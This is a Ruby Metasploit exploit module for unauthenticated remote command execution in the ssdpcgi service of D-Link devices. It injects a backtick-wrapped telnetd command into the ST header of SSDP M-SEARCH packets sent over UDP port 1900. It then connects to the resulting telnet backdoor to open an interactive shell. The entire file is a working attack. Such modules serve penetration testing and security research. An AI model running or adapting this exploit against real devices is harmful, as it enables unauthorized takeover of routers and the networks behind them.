##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',
      'Description' => %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      'Author'      =>
        [
          's1kr10s',
          'secenv'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          # ['CVE', 'nada'],
          ['URL', 'https://medium.com/@s1kr10s/']
        ],
      'DisclosureDate' => 'Dec 24 2019',
      'Privileged'     => true,
      'Platform'       => 'unix',
      'Arch'        => ARCH_CMD,
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'cmd/unix/interact'
        },
      'Targets'        =>
        [
          [ 'urn',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'uuid',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ]
        ],
      'DefaultTarget'  => 0
      ))

  register_options(
    [
      Opt::RHOST(),
      Opt::RPORT(1900)
    ], self.class)
  end

  def exploit
    telnetport = rand(65535)

    print_status("#{rhost}:#{rport} - Telnet port used: #{telnetport}")
    cmd = "`telnetd -p #{telnetport}`"

    print_status("#{rhost}:#{rport} - Sending exploit request...")

    if target.name =~ /urn/
      telnet_payload_urn(cmd)
    elsif target.name =~ /uuid/
      telnet_payload_uuid(cmd)
    end

    sleep 1
    telnet_connect(rhost, telnetport)
  end

  def telnet_payload_urn(cmd)
    print_status("Target -> urn:")
    connect_udp
    header =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:urn:device:1;#{cmd}\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end

  def telnet_payload_uuid(cmd)
    print_status("Target -> uuid:")
    connect_udp
    header =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:uuid:#{cmd}\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end

  def telnet_connect(rhost, telnetport)
    tcp_sock = Rex::Socket.create_tcp({
        'PeerHost' => rhost, 
        'PeerPort' => telnetport.to_i
    })
    if tcp_sock.nil?
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end

    print_good("#{rhost}:#{rport} - Backdoor service has been spawned, handling...")
    add_socket(tcp_sock)

    print_status "Attempting to start a Telnet session #{rhost}:#{telnetport}"
    print_good("#{rhost}:#{rport} - Telnet session successfully established...")

    handler(tcp_sock)
    if session_created?
        remove_socket(tcp_sock)
    end
  end
end
